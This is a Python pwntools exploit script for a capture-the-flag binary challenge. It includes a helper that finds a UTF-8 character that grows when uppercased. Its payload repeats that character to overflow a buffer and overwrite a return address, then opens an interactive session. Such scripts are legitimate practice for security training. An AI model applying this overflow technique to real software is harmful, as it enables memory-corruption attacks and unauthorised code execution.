from pwn import *

HOST = 'chal.amt.rs'
PORT = 1337

exe = ELF('./chal')

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])
"""
def bitlen(val):
    i = 4
    while True:
        if val >> i == 0:
            return i
        i = i + 4

def convert2_utf8_lowercase(val):
    len_bit = bitlen(val)
    if len_bit % 8 != 0:
        return None

    try:
        c = pack(val, bits = bitlen(val)).decode('utf-8')
        if len(c) != 1 or c == c.upper():
            return None
        return c
    except:
        return None

val = 0
while True:
    c = convert2_utf8_lowercase(val)
    if c != None:
        log.info(f'trying {val : #x}')
        lowercase_code = c.encode('utf-8')
        uppercase_code = c.upper().encode('utf-8')

        if len(lowercase_code) != len(uppercase_code):
            log.info(f'found! {val : #x}')
            exit(0)
    val = val + 1
"""

io = start()
io.sendline(b'\xc9\x80' * 0x562 + b'a'+ b'\xc2\xa1\x12\x40\x00\x00\x00\x00\x00')
io.interactive()
